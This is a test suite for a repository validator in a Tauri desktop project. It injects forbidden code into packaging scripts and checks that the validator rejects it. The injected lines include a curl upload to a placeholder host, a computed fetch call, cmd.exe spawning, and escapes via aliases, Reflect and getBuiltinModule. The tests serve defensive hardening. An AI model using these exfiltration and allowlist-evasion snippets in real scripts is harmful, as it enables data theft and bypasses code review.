import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import {
  cpSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import test from "node:test";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const validator = join(root, "scripts", "validate-repository.mjs");

function replace(path, transform) {
  const source = readFileSync(path, "utf8");
  const changed = transform(source);
  writeFileSync(path, changed, "utf8");
}

function normalizedSourceHash(source) {
  return createHash("sha256")
    .update(source.replace(/\r\n?/g, "\n"), "utf8")
    .digest("hex");
}

function syncFakeManifestSeal(fixture) {
  const manifest = readFileSync(
    join(fixture, "tools", "fake-cli", "Cargo.toml"),
    "utf8",
  ).replace(/^\uFEFF/, "");
  replace(join(fixture, "scripts", "validate-repository.mjs"), (source) => {
    const changed = source.replace(
      /const fakeManifestSourceSeal = "[a-f0-9]{64}";/,
      `const fakeManifestSourceSeal = "${normalizedSourceHash(manifest)}";`,
    );
    assert.notEqual(changed, source, "fixture validator seal was not updated");
    return changed;
  });
}

function syncPortableSourceSeals(fixture) {
  const paths = [
    "scripts/package-portable.mjs",
    "scripts/compress-portable.ps1",
    "scripts/extract-portable.ps1",
  ];
  replace(join(fixture, "scripts", "validate-repository.mjs"), (source) => {
    let changed = source;
    for (const path of paths) {
      const portableSource = readFileSync(join(fixture, path), "utf8");
      const hash = normalizedSourceHash(portableSource);
      const escaped = path.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      const pattern = new RegExp(
        `("${escaped}"\\s*,\\s*\\n?\\s*")([a-f0-9]{64})(")`,
      );
      assert.match(changed, pattern, `${path} fixture seal was not found`);
      changed = changed.replace(pattern, `$1${hash}$3`);
    }
    return changed;
  });
}

function runNegativeFixture(mutate, { fixtureValidator = false } = {}) {
  const fixture = mkdtempSync(join(tmpdir(), "ability-radar-contract-"));
  try {
    cpSync(root, fixture, {
      recursive: true,
      filter(source) {
        const relative = source.slice(root.length).replaceAll("\\", "/");
        return ![
          "/.git",
          "/.playwright-cli",
          "/.superpowers",
          "/node_modules",
          "/output",
          "/target",
        ].some((excluded) => relative === excluded || relative.startsWith(`${excluded}/`));
      },
    });
    mutate(fixture);
    const validatorPath = fixtureValidator
      ? join(fixture, "scripts", "validate-repository.mjs")
      : validator;
    if (fixtureValidator) {
      mkdirSync(join(fixture, "node_modules"), { recursive: true });
      symlinkSync(
        join(root, "node_modules", "typescript"),
        join(fixture, "node_modules", "typescript"),
        "junction",
      );
    }
    return spawnSync(process.execPath, [validatorPath], {
      cwd: fixture,
      env: { ...process.env, REPOSITORY_ROOT: fixture },
      encoding: "utf8",
    });
  } finally {
    rmSync(fixture, { recursive: true, force: true });
  }
}

function assertRejected(result, expected) {
  assert.equal(
    result.status,
    1,
    `fixture unexpectedly passed:\n${result.stdout}\n${result.stderr}`,
  );
  assert.match(`${result.stdout}\n${result.stderr}`, expected);
}

function assertAccepted(result) {
  assert.equal(
    result.status,
    0,
    `fixture unexpectedly failed:\n${result.stdout}\n${result.stderr}`,
  );
}

function runPortableMutation(path, transform) {
  return runNegativeFixture(
    (fixture) => {
      replace(join(fixture, path), (source) => {
        const changed = transform(source);
        assert.notEqual(changed, source, `${path} mutation did not change source`);
        return changed;
      });
      syncPortableSourceSeals(fixture);
    },
    { fixtureValidator: true },
  );
}

test("all first-party manifests require version 0.2.2", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "package.json"), (source) => {
      const manifest = JSON.parse(source);
      manifest.version = "0.2.1";
      return `${JSON.stringify(manifest, null, 2)}\n`;
    });
  });
  assertRejected(result, /package\.json version must be 0\.2\.2/i);
});

test("source start command cannot point to Vite", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "package.json"), (source) => {
      const manifest = JSON.parse(source);
      manifest.scripts.start = "vite";
      return `${JSON.stringify(manifest, null, 2)}\n`;
    });
  });
  assertRejected(result, /start.*npm run tauri -- dev/i);
});

test("portable package command cannot skip the Tauri no-bundle build", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "package.json"), (source) => {
      const manifest = JSON.parse(source);
      manifest.scripts["package:portable"] =
        "npm run package:portable:from-build";
      return `${JSON.stringify(manifest, null, 2)}\n`;
    });
  });
  assertRejected(result, /package:portable.*tauri.*build.*--no-bundle/i);
});

test("portable entry points reject real provider invocations", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nspawnSync("codex", ["exec", "forbidden"]);\n`,
  );
  assertRejected(
    result,
    /portable Node AST allowlist|operation allowlist|child process allowlist/i,
  );
});

test("portable entry points reject network upload commands", () => {
  const result = runPortableMutation(
    "scripts/compress-portable.ps1",
    (source) =>
      `${source}\ncurl.exe -T $destinationPath https://example.invalid/upload\n`,
  );
  assertRejected(result, /portable PowerShell operation allowlist/i);
});

test("portable entry points reject writes outside the portable bundle", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) =>
      `${source}\nawait writeFile(join(repoRoot, "escaped.txt"), "forbidden");\n`,
  );
  assertRejected(result, /portable Node AST allowlist|operation allowlist/i);
});

test("portable Node import allowlist rejects an aliased child process", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => source
      .replace(
        'import { spawnSync } from "node:child_process";',
        'import { spawnSync as runPowerShell } from "node:child_process";',
      )
      .replace("const result = spawnSync(", "const result = runPowerShell("),
  );
  assertRejected(
    result,
    /portable Node AST allowlist|import allowlist|child process allowlist/i,
  );
});

test("portable Node child-process allowlist rejects another executable", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => source.replace('"powershell.exe"', '"cmd.exe"'),
  );
  assertRejected(
    result,
    /portable Node AST allowlist|child process allowlist/i,
  );
});

test("portable PowerShell operation allowlist rejects aliases", () => {
  const result = runPortableMutation(
    "scripts/compress-portable.ps1",
    (source) => source.replace(
      "Compress-Archive `",
      "Set-Alias ca Compress-Archive\nca `",
    ),
  );
  assertRejected(result, /portable PowerShell operation allowlist/i);
});

test("portable PowerShell operation allowlist rejects dynamic invocation", () => {
  const result = runPortableMutation(
    "scripts/compress-portable.ps1",
    (source) => source.replace(
      "Compress-Archive `",
      '& ("Compress" + "-Archive") `',
    ),
  );
  assertRejected(result, /portable PowerShell operation allowlist/i);
});

test("portable Node operation allowlist checks copy destinations", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) =>
      `${source}\nawait copyFile(executable, join(repoRoot, "escaped.exe"));\n`,
  );
  assertRejected(
    result,
    /portable Node AST allowlist.*copyFile|portable Node AST allowlist.*direct call counts|portable Node operation allowlist.*copyFile/i,
  );
});

test("portable Node import allowlist rejects write streams", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => source
      .replace(
        'import { createHash, randomUUID } from "node:crypto";',
        'import { createHash, randomUUID } from "node:crypto";\nimport { createWriteStream } from "node:fs";',
      )
      .concat('\ncreateWriteStream(join(repoRoot, "escaped.zip"));\n'),
  );
  assertRejected(
    result,
    /portable Node AST allowlist|import allowlist|operation allowlist/i,
  );
});

test("portable Node operation allowlist rejects indirect rename escapes", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) =>
      `${source}\nawait import("node:fs/promises").then(({ rename }) => rename(stageRoot, repoRoot));\n`,
  );
  assertRejected(
    result,
    /portable Node AST allowlist|import allowlist|operation allowlist/i,
  );
});

test("portable Node operation allowlist rejects Reflect write escapes", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) =>
      `${source}\nReflect.apply(writeFile, undefined, [join(repoRoot, "escaped"), "x"]);\n`,
  );
  assertRejected(
    result,
    /portable Node AST allowlist|operation allowlist|indirect/i,
  );
});

test("portable Node child-process allowlist rejects Reflect execution", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) =>
      `${source}\nReflect.apply(spawnSync, undefined, ["cmd.exe", ["/c", "exit"]]);\n`,
  );
  assertRejected(
    result,
    /portable Node AST allowlist|child process allowlist|indirect/i,
  );
});

test("portable Node import allowlist rejects network modules", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `import "node:https";\n${source}`,
  );
  assertRejected(
    result,
    /portable Node AST allowlist|import allowlist|network/i,
  );
});

test("portable Node import allowlist rejects computed network APIs", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nglobalThis["fetch"]("https://example.invalid");\n`,
  );
  assertRejected(result, /portable Node import allowlist|network|indirect/i);
});

test("portable Node syntax rejects process.getBuiltinModule child access", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) =>
      `${source}\nprocess.getBuiltinModule("node:child_process")["spawnSync"]("cmd.exe");\n`,
  );
  assertRejected(result, /portable Node.*syntax|import allowlist|indirect/i);
});

test("portable Node syntax rejects global computed fetch", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nglobal["fetch"]("https://example.invalid");\n`,
  );
  assertRejected(result, /portable Node.*syntax|network|indirect/i);
});

test("portable Node syntax rejects computed sensitive calls", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\n({})["spawnSync"]("cmd.exe");\n`,
  );
  assertRejected(result, /portable Node.*syntax|child process|indirect/i);
});

test("portable Node syntax rejects local capability aliases", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nconst execute = spawnSync;\nexecute("cmd.exe");\n`,
  );
  assertRejected(result, /portable Node.*syntax|child process|alias/i);
});

test("portable AST rejects computed getBuiltinModule destructuring bypass", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) =>
      `${source}\nconst { spawnSync: execute } = process["getBuiltinModule"]("node:child_process");\nexecute("cmd.exe");\n`,
  );
  assertRejected(result, /portable Node.*(?:AST|syntax|alias|callee)/i);
});

test("portable AST rejects parenthesized capability aliases", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nconst execute = (spawnSync);\nexecute("cmd.exe");\n`,
  );
  assertRejected(result, /portable Node.*(?:AST|syntax|alias|callee)/i);
});

test("portable AST rejects assignment capability aliases", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nlet execute;\nexecute = spawnSync;\nexecute("cmd.exe");\n`,
  );
  assertRejected(result, /portable Node.*(?:AST|syntax|alias|callee)/i);
});

test("portable AST rejects computed getBuiltinModule calls", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) =>
      `${source}\nprocess["getBuiltinModule"]("node:child_process");\n`,
  );
  assertRejected(result, /portable Node.*(?:AST|syntax|builtin|callee)/i);
});

test("portable AST rejects unknown direct callees", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nmysteryPortableOperation();\n`,
  );
  assertRejected(result, /portable Node.*(?:AST|syntax|unknown|callee)/i);
});

test("portable AST rejects block-local imported-name shadowing", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => source.replace(
      'const targetDir = join(repoRoot, "target", "release");',
      '{\n    const join = () => repoRoot;\n    const targetDir = join(repoRoot, "target", "release");\n  }',
    ),
  );
  assertRejected(result, /portable Node AST.*(?:binding|shadow|declaration)/i);
});

test("portable AST rejects imported-name parameter shadowing", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nfunction shadowImportedJoin(join) { return join; }\n`,
  );
  assertRejected(result, /portable Node AST.*(?:binding|shadow|parameter)/i);
});

test("portable AST rejects destructured imported-name shadowing", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\n{ const { join } = {}; }\n`,
  );
  assertRejected(result, /portable Node AST.*(?:binding|shadow|destructur)/i);
});

test("portable AST rejects imported-name assignment shadowing", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\njoin = () => repoRoot;\n`,
  );
  assertRejected(result, /portable Node AST.*(?:binding|shadow|assignment)/i);
});

test("portable AST rejects parenthesized imported-name aliases", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => `${source}\nconst portableJoin = (join);\n`,
  );
  assertRejected(result, /portable Node AST.*(?:binding|shadow|alias)/i);
});

test("portable PowerShell operation allowlist rejects ScriptBlock creation", () => {
  const result = runPortableMutation(
    "scripts/compress-portable.ps1",
    (source) =>
      `${source}\n[ScriptBlock]::Create("Compress-Archive").Invoke()\n`,
  );
  assertRejected(result, /portable PowerShell operation allowlist/i);
});

test("portable compressor destination must remain the temporary archive", () => {
  const result = runPortableMutation(
    "scripts/package-portable.mjs",
    (source) => source.replace(
      '"-Destination",\n        temporaryArchive,',
      '"-Destination",\n        repoRoot,',
    ),
  );
  assertRejected(
    result,
    /portable Node AST allowlist|child process allowlist|destination/i,
  );
});

test("portable raw ZIP contract pins a zero-comment classic EOCD to EOF", () => {
  const mutations = [
    (source) => source.replace(
      "const offset = bytes.length - 22;",
      "const offset = bytes.length - 23;",
    ),
    (source) => source.replace(
      "commentLength !== 0",
      "commentLength === 0",
    ),
    (source) => source.replace(
      "offset + 22 + commentLength !== bytes.length",
      "offset + 22 + commentLength === bytes.length",
    ),
  ];

  for (const mutate of mutations) {
    const result = runPortableMutation(
      "scripts/package-portable.mjs",
      mutate,
    );
    assertRejected(
      result,
      /portable Node AST allowlist.*classic EOCD.*zero archive comment.*EOF/i,
    );
  }
});

test("portable semantic checks tolerate harmless comments with reviewed seals", () => {
  const result = runNegativeFixture(
    (fixture) => {
      replace(
        join(fixture, "scripts", "package-portable.mjs"),
        (source) => {
          const changed = source.replace(
            'import { createHash, randomUUID } from "node:crypto";',
            '// Reviewed portable packager.\nimport { createHash, randomUUID } from "node:crypto";',
          );
          assert.notEqual(changed, source, "Node comment mutation did not apply");
          return changed;
        },
      );
      replace(
        join(fixture, "scripts", "compress-portable.ps1"),
        (source) => {
          const changed = `# Reviewed compressor.\n${source}`;
          assert.notEqual(
            changed,
            source,
            "PowerShell comment mutation did not apply",
          );
          return changed;
        },
      );
      syncPortableSourceSeals(fixture);
    },
    { fixtureValidator: true },
  );
  assertAccepted(result);
});

test("repository validator parser is an exact root dependency", () => {
  const packageManifest = JSON.parse(
    readFileSync(join(root, "package.json"), "utf8"),
  );
  const lock = JSON.parse(readFileSync(join(root, "package-lock.json"), "utf8"));
  assert.equal(packageManifest.devDependencies?.typescript, "5.8.3");
  assert.equal(lock.packages?.[""]?.devDependencies?.typescript, "5.8.3");
  assert.equal(lock.packages?.["node_modules/typescript"]?.version, "5.8.3");
});

test("repository validator rejects parser dependency version ranges", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "package.json"), (source) => {
      const manifest = JSON.parse(source);
      manifest.devDependencies.typescript = "~5.8.3";
      return `${JSON.stringify(manifest, null, 2)}\n`;
    });
  });
  assertRejected(result, /TypeScript parser.*exactly 5\.8\.3/i);
});

test("comment-only action cannot satisfy a required workflow action", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(
        /^(\s*)uses: actions\/upload-artifact@([^\n]+)$/m,
        "$1# uses: actions/upload-artifact@$2",
      ));
  });
  assertRejected(result, /actions\/upload-artifact/);
});

test("rust-toolchain action requires an explicit stable toolchain input", () => {
  const result = runNegativeFixture((fixture) => {
    for (const name of ["ci.yml", "release.yml"]) {
      replace(join(fixture, ".github", "workflows", name), (source) =>
        source.replace(/^\s*toolchain:\s*stable\s*$/m, ""));
    }
  });
  assertRejected(result, /toolchain.*stable/i);
});

test("Pages build permissions require contents read and pages read", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(/^\s*pages:\s*read\s*$/m, ""));
  });
  assertRejected(result, /pages.*read/i);
});

test("Pages validation requires deterministic dependency installation first", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        "      - name: Install repository dependencies\n        run: npm ci\n",
        "",
      ));
  });
  assertRejected(result, /Pages.*npm ci|dependency installation/i);
});

test("comment-only permission cannot satisfy a Pages job permission", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "pages.yml"), (source) =>
      source.replace(
        /^(\s*)pages:\s*read\s*$/m,
        "$1# pages: read",
      ));
  });
  assertRejected(result, /pages.*read/i);
});

test("comment-only command cannot satisfy the dependency audit gate", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "workflows", "ci.yml"), (source) =>
      source.replace(/^(\s*)cargo audit\s*$/m, "$1# cargo audit"));
  });
  assertRejected(result, /cargo audit/i);
});

for (const indicator of ["|-", "|+", ">", ">-", ">+", "|2-", ">+2"]) {
  test(`real provider commands are rejected in ${indicator} block scalars`, () => {
    const result = runNegativeFixture((fixture) => {
      replace(join(fixture, ".github", "workflows", "release.yml"), (source) =>
        `${source}\n      - name: forbidden real provider\n        run: ${indicator}\n          codex exec forbidden\n`);
    });
    assertRejected(result, /real AI CLI|codex/i);
  });
}

test("pending v0.2.2 copy keeps every public download CTA inactive", () => {
  const site = readFileSync(join(root, "site", "index.html"), "utf8");
  const readme = readFileSync(join(root, "README.md"), "utf8");

  assert.match(site, /v0\.2\.1.*(?:候选|待发布)/s);
  assert.match(site, /clean Windows 10\/11.*公开发布.*开放下载/s);
  assert.doesNotMatch(site, /\/releases\/(?:tag\/v0\.2\.1|latest)/);
  assert.doesNotMatch(site, /id="release-link"[^>]*href=/);
  assert.match(readme, /v0\.2\.1.*(?:候选|待发布)/s);
  assert.match(readme, /clean Windows 10\/11.*公开发布.*开放下载/s);
  assert.doesNotMatch(readme, /从.*Releases.*下载 v0\.2\.1/s);
});

test("README requires the exact Tauri source start commands", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "README.md"), (source) =>
      source.replace(
        "npm ci\nnpm start",
        "npm install\nnpm start",
      ));
  });
  assertRejected(result, /README\.md.*npm ci.*npm start/si);
});

test("README current-status banner rejects v0.2", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "README.md"), (source) => {
      const changed = source.replace(
        /^> 当前状态：[^\n]+$/m,
        "> 当前状态：v0.2 Windows 预览版（旧版 banner）。支持 Windows 10/11 x64；安装程序尚未签名，也没有自动更新。",
      );
      assert.notEqual(changed, source, "README banner mutation must change the fixture");
      return changed;
    });
  });
  assertRejected(result, /README\.md.*v0\.2\.1.*pending-status|当前状态/i);
});

test("README rejects treating the Vite URL as the complete product", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "README.md"), (source) =>
      `${source}\nOpening http://localhost:1420 in a normal browser is the complete product.\n`);
  });
  assertRejected(result, /README\.md.*localhost:1420.*complete product|完整产品/si);
});

test("README requires the portable packaging command", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "README.md"), (source) =>
      source.replace(
        "npm run package:portable",
        "npm run package:portable-old",
      ));
  });
  assertRejected(result, /README\.md.*package:portable/i);
});

test("troubleshooting requires the confirmed npm shim checks", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "troubleshooting.md"), (source) =>
      source.replace("codex.cmd --version", "codex --version"));
  });
  assertRejected(result, /troubleshooting\.md.*npm.*shim|codex\.cmd --version/si);
});

test("troubleshooting must say the version check sends no model request", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "troubleshooting.md"), (source) =>
      source.replace(
        /`--version`[^\n]*(?:不会|不发送)[^\n]*(?:模型请求|model request)[^\n]*/i,
        "",
      ));
  });
  assertRejected(result, /troubleshooting\.md.*--version.*model request|模型请求/si);
});

test("troubleshooting requires the in-app CLI recheck path", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "troubleshooting.md"), (source) =>
      source.replaceAll("重新检测 CLI", "重新启动应用"));
  });
  assertRejected(result, /troubleshooting\.md.*重新检测 CLI/);
});

test("troubleshooting rejects an unconditional no-restart claim", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "troubleshooting.md"), (source) => {
      const changed = source.replace(
        "“重新检测 CLI”。如果变化发生在应用启动时已经继承的 PATH 目录内，可以立即重新检测；如果安装程序\n新增了 User 或 Machine PATH 目录，请先重启应用，再点击“重新检测 CLI”。",
        "“重新检测 CLI”，无需重启应用。",
      );
      assert.notEqual(changed, source, "no-restart mutation must change the fixture");
      return changed;
    });
  });
  assertRejected(result, /troubleshooting\.md.*(?:no-restart|无需重启)/i);
});

test("methodology requires all four provider effort matrices", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "methodology.md"), (source) =>
      source.replace(
        "| Codex CLI | CLI 默认、`minimal`、`low`、`medium`、`high`、`xhigh`、`max`、`ultra`，以及自定义 |",
        "| Codex CLI | `low`、`medium`、`high` |",
      ));
  });
  assertRejected(result, /methodology\.md.*provider effort matrix|推理档位矩阵/i);
});

test("methodology rejects preserving input case for known reasoning values", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "methodology.md"), (source) => {
      const changed = source.replace(
        "当前推理档位矩阵如下。",
        "当前推理档位矩阵如下。已知推理值保留输入大小写。",
      );
      assert.notEqual(changed, source, "known-value mutation must change the fixture");
      return changed;
    });
  });
  assertRejected(result, /methodology\.md.*known reasoning|已知推理值.*小写/i);
});

test("methodology rejects lowercasing manual custom display labels", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "methodology.md"), (source) => {
      const changed = source.replace(
        "“自定义”只记录经过",
        "手动自定义标签统一转为小写；“自定义”只记录经过",
      );
      assert.notEqual(changed, source, "manual-label mutation must change the fixture");
      return changed;
    });
  });
  assertRejected(result, /methodology\.md.*manual custom|手动自定义标签.*显示文本/i);
});

test("methodology rejects preserving original case for CLI custom values", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "methodology.md"), (source) => {
      const changed = source.replace(
        "ChatGPT/Codex 的",
        "CLI 自定义值保留原始大小写。ChatGPT/Codex 的",
      );
      assert.notEqual(changed, source, "CLI custom-value mutation must change the fixture");
      return changed;
    });
  });
  assertRejected(result, /methodology\.md.*CLI custom|CLI 自定义值.*小写安全 token/i);
});

test("release checklist requires portable archive gates", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "release-checklist.md"), (source) =>
      source.replace(
        /- \[ \] 免安装 ZIP[^\n]*\n/g,
        "",
      ));
  });
  assertRejected(result, /release-checklist\.md.*portable|免安装 ZIP/si);
});

test("Windows acceptance matrix requires portable launch rows", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "docs", "test-matrix.md"), (source) =>
      source.replace(
        /^\| Portable ZIP launch[^\n]*\n/gm,
        "",
      ));
  });
  assertRejected(result, /test-matrix\.md.*Portable ZIP launch/i);
});

test("site rejects an active exact-tag v0.2.2 download link while pending", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "site", "index.html"), (source) => {
      const changed = source.replace(
        '<span class="button disabled" id="release-link" aria-disabled="true">v0.2.2 下载待开放</span>',
        '<a class="button" id="release-link" href="https://github.invalid/example/releases/tag/v0.2.2">下载 v0.2.2 安装程序或免安装 ZIP</a>',
      );
      assert.notEqual(changed, source, "active release-link mutation must change the fixture");
      return changed;
    });
  });
  assertRejected(result, /site\/index\.html.*(?:release URL|download CTA|下载)/si);
});

test("site rejects a dead latest-release CTA while pending", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "site", "index.html"), (source) =>
      `${source}\n<a id="release-link-copy" href="/releases/latest">当前发布</a>\n`);
  });
  assertRejected(result, /site\/index\.html.*release URL/i);
});

test("README rejects a current-release claim while v0.2.2 is pending", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "README.md"), (source) =>
      `${source}\n\nv0.2.2 公开预览当前提供安装程序和免安装 ZIP 下载。\n`);
  });
  assertRejected(result, /README\.md.*currently downloadable|公开.*下载/i);
});

test("bug report example requires version 0.2.2", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, ".github", "ISSUE_TEMPLATE", "bug.yml"), (source) =>
      source.replace("例如 0.2.2", "例如 0.2.0"));
  });
  assertRejected(result, /bug\.yml.*0\.2\.2/i);
});

test("npm license metadata rejects missing resolved and integrity lock provenance", () => {
  const result = runNegativeFixture((fixture) => {
    const reportPath = join(
      fixture,
      "docs",
      "licenses",
      "npm-dependencies.json",
    );
    replace(reportPath, (source) => {
      const report = JSON.parse(source);
      const pkg = report.packages.find(
        (candidate) => candidate.resolved && candidate.integrity,
      );
      assert.ok(pkg, "fixture needs an npm package with lock provenance");
      delete pkg.resolved;
      delete pkg.integrity;
      return `${JSON.stringify(report, null, 2)}\n`;
    });
  });
  assertRejected(result, /resolved URL differs/i);
  assert.match(`${result.stdout}\n${result.stderr}`, /integrity differs/i);
});

test("fake CLI fixture version is independently pinned", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      source.replace('version = "0.1.0"', 'version = "0.2.0"'),
    );
  });
  assertRejected(result, /fake CLI.*0\.1\.0/i);
});

test("fake CLI publish prohibition is independently enforced", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      source.replace("publish = false", "publish = true"),
    );
  });
  assertRejected(result, /fake CLI.*publish = false/i);
});

test("fake CLI workspace membership is independently enforced", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "Cargo.toml"), (source) =>
      source.replace('  "tools/fake-cli",\n', ""),
    );
  });
  assertRejected(result, /workspace.*tools\/fake-cli/i);
});

test("comment-only fake CLI workspace membership is rejected", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "Cargo.toml"), (source) =>
      source.replace(
        '  "tools/fake-cli",\n',
        '  # "tools/fake-cli",\n',
      ),
    );
  });
  assertRejected(result, /workspace.*tools\/fake-cli.*exactly once/i);
});

test("duplicate fake CLI workspace membership is rejected", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "Cargo.toml"), (source) =>
      source.replace(
        '  "tools/fake-cli",\n',
        '  "tools/fake-cli",\n  "tools/fake-cli",\n',
      ),
    );
  });
  assertRejected(result, /workspace.*tools\/fake-cli.*exactly once/i);
});

test("fake CLI lock entry is independently enforced", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "Cargo.lock"), (source) =>
      source.replace(
        /\[\[package\]\]\r?\nname = "ability-radar-fake-cli"\r?\nversion = "0\.1\.0"\r?\ndependencies = \[\r?\n "serde_json",\r?\n\]\r?\n\r?\n/,
        "",
      ),
    );
  });
  assertRejected(result, /Cargo\.lock.*fake CLI.*0\.1\.0/i);
});

test("fake CLI dependency shape is independently enforced", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      source.replace('serde_json = "1"', 'serde_json = { version = "1", features = ["preserve_order"] }'),
    );
  });
  assertRejected(result, /fake CLI manifest.*serde_json dependency/i);
});

test("fake CLI manifest rejects extra dependencies", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      source.replace('serde_json = "1"', 'serde_json = "1"\ntempfile = "3"'),
    );
  });
  assertRejected(result, /fake CLI dependency set.*exactly.*serde_json/i);
});

test("fake CLI manifest rejects build dependencies", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[build-dependencies]\ntempfile = "3"\n`,
    );
  });
  assertRejected(result, /fake CLI dependency surface.*build-dependencies/i);
});

test("fake CLI manifest rejects dev dependencies", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[dev-dependencies]\ntempfile = "3"\n`,
    );
  });
  assertRejected(result, /fake CLI dependency surface.*dev-dependencies/i);
});

test("fake CLI manifest rejects target-specific dependencies", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[target.'cfg(windows)'.dependencies]\ntempfile = "3"\n`,
    );
  });
  assertRejected(result, /fake CLI dependency surface.*target/i);
});

test("fake CLI lock entry rejects extra dependencies", () => {
  const result = runNegativeFixture((fixture) => {
    const lockPath = join(fixture, "Cargo.lock");
    replace(lockPath, (source) =>
      source.replace(
        'name = "ability-radar-fake-cli"\nversion = "0.1.0"\ndependencies = [\n "serde_json",',
        'name = "ability-radar-fake-cli"\nversion = "0.1.0"\ndependencies = [\n "serde_json",\n "tempfile",',
      ),
    );
    const normalizedLock = readFileSync(lockPath, "utf8").replace(
      /\r\n?/g,
      "\n",
    );
    const lockHash = createHash("sha256")
      .update(normalizedLock, "utf8")
      .digest("hex");
    replace(
      join(fixture, "docs", "licenses", "rust-dependencies.json"),
      (source) => {
        const report = JSON.parse(source);
        report.lockfileSha256 = lockHash;
        return `${JSON.stringify(report, null, 2)}\n`;
      },
    );
  });
  assertRejected(result, /Cargo\.lock.*fake CLI.*dependencies.*serde_json/i);
});

test("fake CLI manifest rejects a direct dependency subtable", () => {
  const result = runNegativeFixture((fixture) => {
    replace(join(fixture, "tools", "fake-cli", "Cargo.toml"), (source) =>
      `${source}\n[dependencies.tempfile]\nversion = "3"\n`,
    );
  });
  assertRejected(result, /fake CLI dependency surface.*dependencies\.tempfile/i);
});

